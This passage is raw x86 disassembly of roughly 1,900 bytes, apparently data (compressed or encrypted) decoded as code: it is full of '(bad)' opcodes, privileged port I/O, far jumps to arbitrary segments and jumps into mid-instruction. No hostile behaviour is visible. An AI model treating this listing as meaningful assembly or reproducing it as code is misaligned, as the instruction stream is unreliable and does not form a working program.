  41a37e:	mov    ch,0xdb
  41a380:	xchg   edi,eax
  41a381:	icebp  
  41a382:	out    0x62,eax
  41a384:	fmul   st(7),st
  41a386:	jb     0x41a342
  41a388:	inc    esp
  41a389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a38a:	pop    esi
  41a38b:	bound  esi,QWORD PTR [eax]
  41a38d:	ins    DWORD PTR es:[edi],dx
  41a38e:	sub    BYTE PTR ds:0x6668ffbc,al
  41a394:	inc    BYTE PTR [eax]
  41a396:	jg     0x41a3a6
  41a398:	adc    ebp,ebp
  41a39a:	pop    eax
  41a39b:	jbe    0x41a3a8
  41a39d:	out    dx,eax
  41a39e:	push   DWORD PTR [edi+0x6e59734b]
  41a3a4:	retf   0xbc1b
  41a3a7:	(bad)  
  41a3a8:	in     al,0x42
  41a3aa:	cmp    DWORD PTR [ecx+0x63],0x3531b6d3
  41a3b1:	dec    edx
  41a3b2:	jmp    0x41a3c9
  41a3b4:	es sahf 
  41a3b6:	adc    edi,edi
  41a3b8:	and    eax,0x1d9b2294
  41a3bd:	mov    bl,0xa2
  41a3bf:	je     0x41a3ab
  41a3c1:	adc    eax,0x9ffc24bc
  41a3c6:	xor    al,0x56
  41a3c8:	pop    edi
  41a3c9:	test   eax,0xd40fedb
  41a3ce:	xchg   edx,eax
  41a3cf:	ss inc esi
  41a3d1:	outs   dx,DWORD PTR ds:[esi]
  41a3d2:	(bad)  
  41a3d3:	or     eax,0x448dffc8
  41a3d8:	fadd   QWORD PTR [eax-0x695cb2f7]
  41a3de:	fcmovnu st,st(3)
  41a3e0:	int    0x56
  41a3e2:	cmp    al,0x66
  41a3e4:	dec    eax
  41a3e5:	lods   al,BYTE PTR ds:[esi]
  41a3e6:	test   DWORD PTR ds:0xc87de643,esi
  41a3ec:	scas   al,BYTE PTR es:[edi]
  41a3ed:	call   0x73f27a39
  41a3f2:	scas   al,BYTE PTR es:[edi]
  41a3f3:	xor    esp,DWORD PTR [edx]
  41a3f5:	xchg   BYTE PTR [esp+eiz*4+0x210dd610],ah
  41a3fc:	push   0xffffffcd
  41a3fe:	or     eax,0xfd9c3057
  41a403:	sub    ch,BYTE PTR [edi]
  41a405:	je     0x41a415
  41a407:	shl    DWORD PTR [ebx-0x54cc82ba],1
  41a40d:	push   es
  41a40e:	int3   
  41a40f:	cmp    DWORD PTR [eax-0x2c],eax
  41a412:	push   ds
  41a413:	sbb    dh,bh
  41a415:	inc    ebx
  41a416:	ins    BYTE PTR es:[edi],dx
  41a417:	pop    ebp
  41a418:	dec    edi
  41a419:	push   ds
  41a41a:	out    dx,eax
  41a41b:	(bad)  
  41a41c:	clc    
  41a41d:	mov    ds:0x74cb6923,al
  41a422:	test   cl,0xc4
  41a425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a426:	jg     0x41a3e6
  41a428:	daa    
  41a429:	pop    ds
  41a42a:	add    cl,ah
  41a42c:	leave  
  41a42d:	bound  edx,QWORD PTR [ecx-0x2e]
  41a430:	cmp    BYTE PTR [ebp+0x344998a4],ch
  41a436:	jnp    0x41a45e
  41a438:	add    eax,0x95b4d84f
  41a43d:	jb     0x41a3da
  41a43f:	mov    bl,0x63
  41a441:	pushf  
  41a442:	adc    eax,0x51e4d27c
  41a447:	sbb    bh,dl
  41a449:	popa   
  41a44a:	scas   al,BYTE PTR es:[edi]
  41a44b:	loopne 0x41a4b8
  41a44d:	jmp    0x8d2:0xa14c8bf
  41a454:	xchg   edi,eax
  41a455:	into   
  41a456:	dec    eax
  41a457:	mov    eax,0x4daf9dd3
  41a45c:	sub    edi,edi
  41a45e:	(bad)  
  41a45f:	retf   
  41a460:	sbb    ah,BYTE PTR [ebp-0x7930fb18]
  41a466:	test   DWORD PTR [ecx+0x29],esp
  41a469:	fstp   TBYTE PTR [esi+0x63]
  41a46c:	and    cl,BYTE PTR [ecx]
  41a46e:	sbb    ebp,DWORD PTR [ebx]
  41a470:	neg    BYTE PTR [edi+0x21]
  41a473:	imul   BYTE PTR [edi+0x48eeb829]
  41a479:	push   edi
  41a47a:	call   0xf82:0x6735a979
  41a481:	ja     0x41a48f
  41a483:	mov    bl,0xdd
  41a485:	into   
  41a486:	mov    bh,0x3a
  41a488:	push   ebx
  41a489:	fwait
  41a48a:	sbb    al,0x8b
  41a48c:	xor    edx,DWORD PTR [eax-0x12c71de4]
  41a492:	test   DWORD PTR [eax-0x70],0x54bae850
  41a499:	cdq    
  41a49a:	and    BYTE PTR [eax+edx*1],bh
  41a49d:	test   esi,ebp
  41a49f:	retf   0x2954
  41a4a2:	mov    ds:0x36d2d963,eax
  41a4a7:	pop    eax
  41a4a8:	mov    ebp,DWORD PTR [esi]
  41a4aa:	rol    BYTE PTR [edi],cl
  41a4ac:	fmul   QWORD PTR ds:0x28f498e3
  41a4b2:	adc    BYTE PTR [eax],dh
  41a4b4:	rcl    DWORD PTR [ebx+0x1b],cl
  41a4b7:	or     eax,0xe32c4a05
  41a4bc:	mov    ebp,0x9d74836e
  41a4c1:	nop
  41a4c2:	test   DWORD PTR [ecx],0x4445b3f5
  41a4c8:	ins    BYTE PTR es:[edi],dx
  41a4c9:	adc    BYTE PTR [eax-0x3c],ch
  41a4cc:	push   ebp
  41a4cd:	das    
  41a4ce:	clc    
  41a4cf:	in     eax,0x26
  41a4d1:	ins    DWORD PTR es:[edi],dx
  41a4d2:	add    eax,0xe324f218
  41a4d7:	les    eax,FWORD PTR ds:[edx+0x24]
  41a4db:	and    BYTE PTR [ebp+esi*4-0x68],bl
  41a4df:	stos   DWORD PTR es:[edi],eax
  41a4e0:	jle    0x41a4f2
  41a4e2:	cmp    ah,0x28
  41a4e5:	mov    esp,0x8e135756
  41a4ea:	cld    
  41a4eb:	jp     0x41a4af
  41a4ed:	mov    bh,0xbf
  41a4ef:	mov    cl,0xc5
  41a4f1:	jno    0x41a4ec
  41a4f3:	inc    esp
  41a4f4:	icebp  
  41a4f5:	add    BYTE PTR [edx+ebx*8],al
  41a4f8:	mov    edi,0xfcae6624
  41a4fd:	fcomp  QWORD PTR [ebx-0x720c8ba8]
  41a503:	cmp    al,0xb3
  41a505:	int3   
  41a506:	mov    eax,0x6600eaf9
  41a50b:	adc    eax,0xd3217b60
  41a510:	or     BYTE PTR [edi],bh
  41a512:	(bad)  
  41a513:	and    BYTE PTR [eax],dh
  41a515:	and    esp,0x3e
  41a518:	cs push 0x68
  41a51b:	imul   ebp,DWORD PTR [ebx],0x3f4eb7fd
  41a521:	call   0xded3:0xade07b9e
  41a528:	and    eax,0x372aeefc
  41a52d:	mov    eax,DWORD PTR [edx-0x4b509afe]
  41a533:	idiv   BYTE PTR [ebx]
  41a535:	sbb    eax,0x51733e42
  41a53a:	xor    eax,DWORD PTR fs:[edi-0x71]
  41a53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a53f:	sbb    al,0xe6
  41a541:	and    BYTE PTR [esi],ah
  41a543:	cmp    ah,cl
  41a545:	xor    al,0xc9
  41a547:	aaa    
  41a548:	mov    BYTE PTR [esi],bh
  41a54a:	test   DWORD PTR [ecx],0xa215849d
  41a550:	mov    bl,0x31
  41a552:	ja     0x41a5af
  41a554:	(bad)  
  41a555:	hlt    
  41a556:	stos   DWORD PTR es:[edi],eax
  41a557:	mov    al,0xd
  41a559:	cmp    ah,BYTE PTR [ebx-0xe42af53]
  41a55f:	cmp    ecx,DWORD PTR [edi-0x7e2bebc8]
  41a565:	mov    esi,0x72ff9420
  41a56a:	xor    eax,0x8b9e7f8c
  41a56f:	rcl    bl,0xca
  41a572:	cmp    eax,0xfbd16993
  41a577:	jmp    0xd869:0x349a56c5
  41a57e:	and    eax,0x2aaa9270
  41a583:	nop
  41a584:	out    0x9d,al
  41a586:	ss jno 0x41a588
  41a589:	outs   dx,DWORD PTR ds:[si]
  41a58b:	std    
  41a58c:	jmp    0x41a564
  41a58e:	popa   
  41a58f:	retf   
  41a590:	xor    dh,BYTE PTR [ebp+0x5ac27d46]
  41a596:	int3   
  41a597:	push   es
  41a598:	mov    ebp,0x5d9a5b97
  41a59d:	pop    ecx
  41a59e:	lock fcos 
  41a5a1:	mov    edx,0xaa5dca92
  41a5a6:	popf   
  41a5a7:	cmp    dl,dl
  41a5a9:	ret    
  41a5aa:	jl     0x41a53d
  41a5ac:	pop    edx
  41a5ad:	inc    eax
  41a5ae:	clc    
  41a5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5b0:	out    0x13,eax
  41a5b2:	fnstcw WORD PTR [ecx-0x67d5d435]
  41a5b8:	(bad)  
  41a5ba:	in     eax,0xa0
  41a5bc:	out    0xc6,al
  41a5be:	cwde   
  41a5bf:	adc    eax,0x123bceb
  41a5c4:	xor    BYTE PTR [edx+esi*1+0x5b57cf96],dh
  41a5cb:	repz xor bl,BYTE PTR [eax-0x580146ed]
  41a5d2:	int3   
  41a5d3:	fidivr WORD PTR [ebp+0x56]
  41a5d6:	or     BYTE PTR [eax+0x70d52561],dh
  41a5dc:	push   ebx
  41a5dd:	sbb    edi,DWORD PTR es:[ebp-0x77365c72]
  41a5e4:	pop    es
  41a5e5:	jmp    0x41a5c1
  41a5e7:	ret    0xfda3
  41a5ea:	pusha  
  41a5eb:	and    eax,0x6466f4e0
  41a5f0:	sub    BYTE PTR [edx+0x949d1a4],0x31
  41a5f7:	jmp    0x41a61a
  41a5f9:	nop
  41a5fa:	mov    edi,0x85e64473
  41a5ff:	push   esi
  41a600:	xor    eax,0x9d31d37f
  41a605:	push   cs
  41a606:	test   al,0x98
  41a608:	jb     0x41a63f
  41a60a:	pusha  
  41a60b:	inc    edx
  41a60c:	out    dx,eax
  41a60d:	mov    ebp,0x39d63cfd
  41a612:	daa    
  41a613:	rol    BYTE PTR [esi-0x73675b83],1
  41a619:	sbb    eax,0x180bd9dd
  41a61e:	dec    ecx
  41a61f:	arpl   WORD PTR [eax-0x26],dx
  41a622:	ins    DWORD PTR es:[edi],dx
  41a623:	ss push ss
  41a625:	adc    eax,0xc68c3991
  41a62a:	jo     0x41a67f
  41a62c:	retf   0x5922
  41a62f:	push   esi
  41a630:	stos   DWORD PTR es:[edi],eax
  41a631:	inc    esp
  41a632:	sbb    DWORD PTR [eax+0x119d0593],0xffffffbd
  41a639:	pushf  
  41a63a:	sub    BYTE PTR [esi+edx*8+0x699bd8eb],dh
  41a641:	mov    eax,DWORD PTR [ebp+0x510c0c00]
  41a647:	cs popa 
  41a649:	sbb    edx,DWORD PTR [edx-0xf17a1ea]
  41a64f:	hlt    
  41a650:	aas    
  41a651:	xor    al,0x76
  41a653:	or     al,0x3c
  41a655:	add    dh,BYTE PTR ds:0x1bd60d7b
  41a65b:	fdiv   DWORD PTR [eax-0x5bbd0177]
  41a661:	xor    al,0x38
  41a663:	and    ebp,DWORD PTR [edi-0x4c]
  41a666:	and    eax,0x11c66951
  41a66b:	out    0x3c,eax
  41a66d:	add    BYTE PTR [edi-0x61a9afe1],dh
  41a673:	and    eax,0x359a94bc
  41a678:	pusha  
  41a679:	sub    eax,0x41507192
  41a67e:	shl    DWORD PTR [edx-0x60],1
  41a681:	in     al,dx
  41a682:	ror    edx,cl
  41a684:	jbe    0x41a6d6
  41a686:	and    al,0x5f
  41a688:	push   edi
  41a689:	pop    ss
  41a68a:	cs ja  0x41a6b4
  41a68d:	cmp    DWORD PTR [ecx+0x6b61d958],eax
  41a693:	mov    bh,0x2c
  41a695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a696:	and    esi,edx
  41a698:	(bad)  
  41a699:	mov    ebx,0xf32de3ae
  41a69e:	gs pusha 
  41a6a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6a1:	fbld   TBYTE PTR [edx+0x26a4c9a4]
  41a6a7:	scas   eax,DWORD PTR es:[edi]
  41a6a8:	cmp    DWORD PTR [ecx-0x64a3fdfb],eax
  41a6ae:	das    
  41a6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6b0:	in     al,0x1a
  41a6b2:	out    dx,al
  41a6b3:	xchg   edx,eax
  41a6b4:	out    dx,eax
  41a6b5:	pop    esi
  41a6b6:	adc    al,0xb6
  41a6b8:	into   
  41a6b9:	repnz (bad) 
  41a6bb:	outs   dx,BYTE PTR ds:[esi]
  41a6bc:	ins    DWORD PTR es:[edi],dx
  41a6bd:	daa    
  41a6be:	xchg   ebp,eax
  41a6bf:	mov    cl,0xd4
  41a6c1:	test   al,0xdf
  41a6c3:	inc    esi
  41a6c4:	or     dh,bl
  41a6c6:	dec    esi
  41a6c7:	test   al,0x62
  41a6c9:	loop   0x41a666
  41a6cb:	cmc    
  41a6cc:	jg     0x41a6f0
  41a6ce:	add    bh,BYTE PTR [ecx]
  41a6d0:	dec    esp
  41a6d1:	adc    al,0xcf
  41a6d3:	es scas al,BYTE PTR es:[edi]
  41a6d5:	cmp    eax,0x58dcb69c
  41a6da:	in     al,0x3c
  41a6dc:	jmp    0x59bbd9a7
  41a6e1:	cs je  0x41a6b8
  41a6e4:	pop    edi
  41a6e5:	jg     0x41a675
  41a6e7:	loopne 0x41a6c5
  41a6e9:	push   0x8ec37af3
  41a6ee:	popf   
  41a6ef:	dec    edx
  41a6f0:	(bad)  
  41a6f2:	(bad)  
  41a6f3:	xor    BYTE PTR [ebx+ebx*8-0x31],dl
  41a6f7:	fcomp  QWORD PTR [edi-0x29a398c2]
  41a6fd:	add    DWORD PTR [esi],0x40
  41a700:	leave  
  41a701:	or     ch,dl
  41a703:	pop    ebp
  41a704:	pushf  
  41a705:	mov    ch,ah
  41a707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a708:	adc    ah,BYTE PTR [eax-0xd]
  41a70b:	hlt    
  41a70c:	add    DWORD PTR [ecx-0x7c2a558a],edx
  41a712:	bswap  esi
  41a714:	adc    ebp,DWORD PTR [ecx+eax*2]
  41a717:	jl     0x41a6d3
  41a719:	int    0x45
  41a71b:	popa   
  41a71c:	dec    esp
  41a71d:	sbb    bl,BYTE PTR [edi]
  41a71f:	mov    edi,0x896b8c78
  41a724:	icebp  
  41a725:	aas    
  41a726:	cmp    DWORD PTR [eax],ebx
  41a728:	enter  0x7ee8,0xc3
  41a72c:	pop    eax
  41a72d:	adc    ax,0x638a
  41a731:	lea    edi,[esi+ecx*4-0x1eceaaa7]
  41a738:	les    esp,FWORD PTR ds:0xa6941522
  41a73e:	scas   eax,DWORD PTR es:[edi]
  41a73f:	sbb    eax,0x3ee7105f
  41a744:	ins    DWORD PTR es:[edi],dx
  41a745:	cdq    
  41a746:	cmp    al,0x7e
  41a748:	mov    ebx,0x88c3579c
  41a74d:	ss fisttp QWORD PTR ss:[edx-0xc]
  41a752:	mov    esi,0x326af035
  41a757:	lds    ebp,FWORD PTR [ebp-0x390d0ebb]
  41a75d:	call   0xa0cc:0x49adc826
  41a764:	clc    
  41a765:	mov    al,0xd7
  41a767:	adc    DWORD PTR [esi+eax*2-0x34],eax
  41a76b:	ss mov ebx,0x244b45da
  41a771:	mov    esp,0x42f170e9
  41a776:	clc    
  41a777:	lock ins BYTE PTR es:[edi],dx
  41a779:	bound  esi,QWORD PTR [esi+eiz*8-0x39]
  41a77d:	sbb    bh,ah
  41a77f:	fst    QWORD PTR [edx-0x11]
  41a782:	(bad)  
  41a783:	sub    al,0x73
  41a785:	adc    al,0x87
  41a787:	xor    BYTE PTR [esi],bl
  41a789:	sub    ebx,DWORD PTR [ebp+0x2]
  41a78c:	loope  0x41a727
  41a78e:	xor    eax,0x2e3e1d5a
  41a793:	mov    eax,ds:0x1ad70a64
  41a798:	ror    BYTE PTR [edx+0xf],1
  41a79b:	cmp    eax,0x66f10949
  41a7a0:	retf   
  41a7a1:	cld    
  41a7a2:	dec    esi
  41a7a3:	adc    BYTE PTR [eax+0x378d63bd],cl
  41a7a9:	xchg   BYTE PTR [ebx-0x62],bh
  41a7ac:	push   ebx
  41a7ad:	mov    ebx,0x809ef028
  41a7b2:	pusha  
  41a7b3:	mov    eax,ds:0xbb0f6418
  41a7b8:	inc    esi
  41a7b9:	out    dx,al
  41a7ba:	inc    edi
  41a7bb:	xchg   ecx,eax
  41a7bc:	xchg   esp,eax
  41a7bd:	pop    ebx
  41a7be:	push   ss
  41a7bf:	xor    dh,BYTE PTR [ebx-0x34884ba]
  41a7c5:	pop    ebp
  41a7c6:	sub    ch,0xcb
  41a7c9:	or     BYTE PTR [ebp-0x21],ah
  41a7cc:	cmp    bl,bl
  41a7ce:	push   eax
  41a7cf:	or     bl,BYTE PTR [ebx-0x46]
  41a7d2:	mov    edx,0xfbb52a55
  41a7d7:	push   ds
  41a7d8:	sbb    ah,BYTE PTR ds:0x1d41ae06
  41a7de:	(bad)  
  41a7df:	aas    
  41a7e0:	adc    ebx,DWORD PTR [esi-0xa8756b1]
  41a7e6:	inc    ebp
  41a7e7:	xchg   ebx,eax
  41a7e8:	jns    0x41a773
  41a7ea:	xchg   ebx,eax
  41a7eb:	adc    dl,BYTE PTR [ecx+0x53]
  41a7ee:	mov    ebx,0xf20dc778
  41a7f3:	and    al,0x4f
  41a7f5:	xchg   esi,eax
  41a7f6:	int    0x78
  41a7f8:	sub    dl,ch
  41a7fa:	(bad)  [ecx+0xf5f3027]
  41a800:	fs inc esi
  41a802:	lods   eax,DWORD PTR ds:[esi]
  41a803:	inc    edi
  41a804:	inc    esp
  41a805:	or     al,0xfe
  41a807:	repz iret 
  41a809:	mov    dl,0x20
  41a80b:	and    al,0xe2
  41a80d:	push   ds
  41a80e:	push   esi
  41a80f:	add    al,0xa8
  41a811:	push   esp
  41a812:	call   0x7a22:0x3a9f2fa7
  41a819:	and    ah,cl
  41a81b:	or     eax,0x6c2a306a
  41a820:	mov    ch,0x85
  41a822:	(bad)  
  41a823:	push   ss
  41a824:	dec    esp
  41a825:	push   ebp
  41a826:	jg     0x41a84d
  41a828:	outs   dx,BYTE PTR ds:[esi]
  41a829:	leave  
  41a82a:	adc    dl,bl
  41a82c:	sahf   
  41a82d:	outs   dx,DWORD PTR ds:[esi]
  41a82e:	or     eax,ebp
  41a830:	jecxz  0x41a848
  41a832:	rcr    BYTE PTR [edx-0x22bb2b57],cl
  41a838:	adc    DWORD PTR [ecx],0x531ff749
  41a83e:	pop    edx
  41a83f:	add    DWORD PTR [esi-0x16dbf4ac],esp
  41a845:	inc    ebx
  41a846:	outs   dx,BYTE PTR ds:[esi]
  41a847:	lods   al,BYTE PTR ds:[esi]
  41a848:	sub    DWORD PTR [edx+ebx*2-0x7f],ecx
  41a84c:	xor    eax,0x7d53ea67
  41a851:	sti    
  41a852:	nop
  41a853:	out    0x67,al
  41a855:	aaa    
  41a856:	mov    bh,0x9a
  41a858:	dec    BYTE PTR [edx+0x8bfefde]
  41a85e:	and    esi,0xb8471bc5
  41a864:	stos   DWORD PTR es:[edi],eax
  41a865:	stos   DWORD PTR es:[edi],eax
  41a866:	(bad)  
  41a867:	cmp    cl,BYTE PTR [ebx-0xf]
  41a86a:	jg     0x41a823
  41a86c:	ds mov esi,0xa1dca823
  41a872:	lea    edx,ds:0xbdd10d08
  41a878:	jmp    0x329a:0xad58fac7
  41a87f:	mov    dh,BYTE PTR [edi+0x6b129626]
  41a885:	xchg   esp,eax
  41a886:	xor    cl,BYTE PTR [edi-0x39]
  41a889:	bound  ebp,QWORD PTR ds:0x8b21b7ad
  41a88f:	mov    ebx,0x467022bf
  41a894:	jle    0x41a8bb
  41a896:	pusha  
  41a897:	lahf   
  41a898:	icebp  
  41a899:	adc    eax,DWORD PTR [ebx]
  41a89b:	cmp    eax,0x90c17289
  41a8a0:	div    DWORD PTR [edi-0x53]
  41a8a3:	dec    eax
  41a8a4:	test   al,0x77
  41a8a6:	data16 and cl,BYTE PTR [esi-0x1b]
  41a8aa:	push   0xdadc182c
  41a8af:	rol    BYTE PTR [ecx-0x485e6e83],0x96
  41a8b6:	ror    DWORD PTR [eax+0x7],1
  41a8b9:	sbb    DWORD PTR [edx],ebx
  41a8bb:	outs   dx,DWORD PTR ds:[esi]
  41a8bc:	dec    esp
  41a8bd:	xchg   esp,eax
  41a8be:	push   es
  41a8bf:	int    0xe3
  41a8c1:	xchg   DWORD PTR [ebp-0x1963c6c5],esi
  41a8c7:	(bad)  
  41a8c8:	addr16 cwde 
  41a8ca:	iret   
  41a8cb:	clc    
  41a8cc:	lods   al,BYTE PTR ds:[esi]
  41a8cd:	ffree  st(6)
  41a8cf:	and    cl,dh
  41a8d1:	out    0xf7,eax
  41a8d3:	fcmove st,st(5)
  41a8d5:	xchg   edx,eax
  41a8d6:	sbb    edi,edx
  41a8d8:	out    0x47,al
  41a8da:	js     0x41a8b5
  41a8dc:	push   0x5efa3190
  41a8e1:	xor    eax,DWORD PTR [edx]
  41a8e3:	int3   
  41a8e4:	lods   eax,DWORD PTR ds:[esi]
  41a8e5:	xor    dl,BYTE PTR [ebx+0x1f56f510]
  41a8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ec:	xlat   BYTE PTR ds:[ebx]
  41a8ed:	fcomp  st(5)
  41a8ef:	or     dh,ch
  41a8f1:	dec    edi
  41a8f2:	cmc    
  41a8f3:	mov    cl,0xa9
  41a8f5:	rol    ebx,0x7
  41a8f8:	mov    edx,eax
  41a8fa:	push   ss
  41a8fb:	pop    eax
  41a8fc:	daa    
  41a8fd:	imul   eax,edx,0x629d9fe
  41a903:	ja     0x41a896
  41a905:	imul   dl
  41a907:	jbe    0x41a8a8
  41a909:	adc    bl,BYTE PTR [edx-0x70]
  41a90c:	jp     0x41a8c0
  41a90e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a90f:	jae    0x41a928
  41a911:	sti    
  41a912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a913:	xchg   ebp,eax
  41a914:	test   BYTE PTR [esp+edi*8-0x5ebf27fb],0xc0
  41a91c:	adc    DWORD PTR [ebp+eiz*2-0x175703a3],esi
  41a923:	arpl   di,bx
  41a925:	pop    ecx
  41a926:	je     0x41a95d
  41a928:	out    dx,al
  41a929:	stc    
  41a92a:	jns    0x41a95b
  41a92c:	lock mov DWORD PTR [ebx+0x32],0x83bcbebc
  41a934:	(bad)  
  41a935:	in     eax,dx
  41a936:	xor    bl,bl
  41a938:	mov    eax,0x55c16acc
  41a93d:	xor    dl,BYTE PTR [edx+edi*8+0x57ebc9b9]
  41a944:	sub    ebx,eax
  41a946:	sub    BYTE PTR [eax],bl
  41a948:	shl    DWORD PTR [edi-0x65da960c],cl
  41a94e:	outs   dx,DWORD PTR ds:[esi]
  41a94f:	shl    BYTE PTR [eax+0x3b],0x4a
  41a953:	fsub   QWORD PTR [esi-0x5a]
  41a956:	test   eax,0x36c17d8f
  41a95b:	sub    eax,0x21b754c6
  41a960:	fadd   DWORD PTR ds:0x55e5cd02
  41a966:	mov    al,ds:0xe8f2bc10
  41a96b:	shl    BYTE PTR [ecx],1
  41a96d:	add    dh,BYTE PTR ds:0xf2f361c9
  41a973:	shl    dh,1
  41a975:	popf   
  41a976:	pop    edi
  41a977:	in     al,0xc7
  41a979:	sbb    eax,0x6174b56d
  41a97e:	xor    eax,0x3263baa6
  41a983:	or     al,0x62
  41a985:	mov    ebx,0xde16753c
  41a98a:	test   BYTE PTR [eax-0x1103fab3],ch
  41a990:	and    eax,0x3382c226
  41a995:	cmp    BYTE PTR [edi-0x501ddcd4],bh
  41a99b:	retf   
  41a99c:	inc    ebx
  41a99d:	out    0x14,eax
  41a99f:	or     bl,BYTE PTR [edx-0x2d]
  41a9a2:	sbb    al,0x25
  41a9a4:	ficom  WORD PTR [ebx-0x8]
  41a9a7:	test   eax,0x71692744
  41a9ac:	lods   eax,DWORD PTR ds:[esi]
  41a9ad:	add    al,0xf2
  41a9af:	or     ecx,DWORD PTR [ebx-0x59]
  41a9b2:	loopne 0x41a98c
  41a9b4:	sbb    ah,cl
  41a9b6:	into   
  41a9b7:	das    
  41a9b8:	jp     0x41a94f
  41a9ba:	adc    eax,esp
  41a9bc:	bound  esi,QWORD PTR ds:0xe538c273
  41a9c2:	enter  0xc7fa,0xde
  41a9c6:	push   0xffffffe8
  41a9c8:	vprotb xmm12,[edi-0x76],xmm6
  41a9ce:	lds    esi,FWORD PTR [edi-0xe1ff4af]
  41a9d4:	cs mov ah,0xf5
  41a9d7:	popf   
  41a9d8:	test   BYTE PTR [ecx+0x19471a12],ch
  41a9de:	rcr    BYTE PTR [ebx-0x45629f68],cl
  41a9e4:	das    
  41a9e5:	inc    ecx
  41a9e6:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a9e8:	add    eax,0x2f5a905a
  41a9ed:	nop
  41a9ee:	cmc    
  41a9ef:	or     al,0x49
  41a9f1:	popf   
  41a9f2:	cmp    DWORD PTR [edi-0xa],esi
  41a9f5:	es call 0x9128:0xf80915b3
  41a9fd:	pop    esi
  41a9fe:	sub    eax,0x1f526721
  41aa03:	cs ds popa 
  41aa06:	add    bh,BYTE PTR [edx]
  41aa08:	fadd   QWORD PTR [ecx+0x3143d0a1]
  41aa0e:	push   0x5b5d077a
  41aa13:	xor    ebx,ebp
  41aa15:	(bad)  
  41aa16:	push   edx
  41aa17:	mov    al,BYTE PTR [eax+0x21]
  41aa1a:	mov    eax,0xdfab1c43
  41aa1f:	cdq    
  41aa20:	jb     0x41aa95
  41aa22:	enter  0x6bac,0x69
  41aa26:	les    ebx,FWORD PTR [edi]
  41aa28:	jae    0x41a9ef
  41aa2a:	push   edx
  41aa2b:	add    BYTE PTR [esi],0x6b
  41aa2e:	mov    eax,cs
  41aa30:	popa   
  41aa31:	xor    ch,al
  41aa33:	out    0x51,al
  41aa35:	loope  0x41aa74
  41aa37:	xchg   ebp,eax
  41aa38:	dec    esi
  41aa39:	std    
  41aa3a:	xchg   ecx,eax
  41aa3b:	add    eax,0x9174b4f9
  41aa40:	popa   
  41aa41:	shl    BYTE PTR [ebx-0x44],0xc2
  41aa45:	int    0xe5
  41aa47:	mov    al,0xd4
  41aa49:	fpatan 
  41aa4b:	xchg   esi,eax
  41aa4c:	push   ds
  41aa4d:	mov    ebp,0xe0b480a5
  41aa52:	lods   eax,DWORD PTR ds:[esi]
  41aa53:	add    eax,0x10858742
  41aa58:	out    0x67,al
  41aa5a:	or     al,0x57
  41aa5c:	outs   dx,BYTE PTR ds:[esi]
  41aa5d:	pusha  
  41aa5e:	scas   eax,DWORD PTR es:[edi]
  41aa5f:	scas   eax,DWORD PTR es:[edi]
  41aa60:	adc    eax,DWORD PTR [ebx-0x796108c]
  41aa66:	loop   0x41aaa1
  41aa68:	cwde   
  41aa69:	pushf  
  41aa6a:	mov    ds:0x9c432ae1,al
  41aa6f:	iret   
  41aa70:	nop
  41aa71:	mov    dl,0xcc
  41aa73:	sar    DWORD PTR [ecx],0x7c
  41aa76:	mov    al,bh
  41aa78:	xor    ecx,DWORD PTR [edi]
  41aa7a:	outs   dx,DWORD PTR ds:[esi]
  41aa7b:	sub    eax,0xdabaab6c
  41aa80:	dec    edx
  41aa81:	aad    0x32
  41aa83:	mov    cl,0x44
  41aa85:	add    esi,ebp
  41aa87:	(bad)  
  41aa88:	adc    DWORD PTR [esi],0x4b56f23
  41aa8e:	shl    ah,1
  41aa90:	or     al,0xae
  41aa92:	test   al,0xf7
  41aa94:	xchg   BYTE PTR [edx-0x4da6ad0e],dl
  41aa9a:	or     bh,BYTE PTR [eax+0x68]
  41aa9d:	or     dl,dl
  41aa9f:	xlat   BYTE PTR ds:[ebx]
  41aaa0:	and    esp,DWORD PTR [esi-0x50047598]
  41aaa6:	(bad)  
  41aaa7:	lods   al,BYTE PTR ds:[esi]
  41aaa8:	push   ds
  41aaa9:	fstp   TBYTE PTR [ecx]
  41aaab:	jae    0x41aaa2
  41aaad:	scas   eax,DWORD PTR es:[edi]
  41aaae:	ret    
  41aaaf:	push   ss
  41aab0:	fwait
  41aab1:	(bad)  
  41aab2:	mov    es,WORD PTR [ecx]
  41aab4:	xlat   BYTE PTR ds:[ebx]
  41aab5:	push   edx
  41aab6:	loope  0x41aaef
  41aab8:	pop    ss
  41aab9:	mov    BYTE PTR [esi-0x78],al
  41aabc:	xor    DWORD PTR [edx-0x7cee1f41],esp
  41aac2:	inc    edi
  41aac3:	jp     0x41ab15
  41aac5:	and    eax,0xc9f0307b
  41aaca:	das    
  41aacb:	add    ebx,esp
  41aacd:	pop    eax
  41aace:	neg    dl
  41aad0:	addr16 xchg ecx,eax
  41aad2:	mov    eax,ds:0xcd935d02
  41aad7:	lahf   
  41aad8:	gs xchg edx,eax
  41aada:	or     ah,ch
  41aadc:	call   0x3f70:0x889a8582
  41aae3:	lahf   
  41aae4:	cli    
  41aae5:	adc    BYTE PTR [ebx+0x5a],cl
  41aae8:	ins    DWORD PTR es:[edi],dx
  41aae9:	adc    esi,ebp
  41aaeb:	mov    DWORD PTR ds:0xe699e095,ebx
  41aaf1:	imul   ebx,DWORD PTR [ebp+0x7ecaca51],0xdd9c6dd
  41aafb:	fsubrp st(3),st
  41aafd:	rol    DWORD PTR [ecx-0xd],0xe9
  41ab01:	imul   edx,DWORD PTR [eax+0x7a2108ed],0x9ad3d1a4
  41ab0b:	sbb    DWORD PTR [edx+0x3e47e30a],ebx
  41ab11:	ins    BYTE PTR es:[edi],dx
  41ab12:	das    
  41ab13:	push   0x1cfdaea6
  41ab18:	in     al,dx
  41ab19:	int3   
  41ab1a:	sbb    al,0x8a
  41ab1c:	sbb    DWORD PTR [edi],ecx
  41ab1e:	xor    edi,esp
  41ab20:	retf   
  41ab21:	stc    
  41ab22:	fwait
  41ab23:	scas   al,BYTE PTR es:[edi]
  41ab24:	sbb    ah,dh
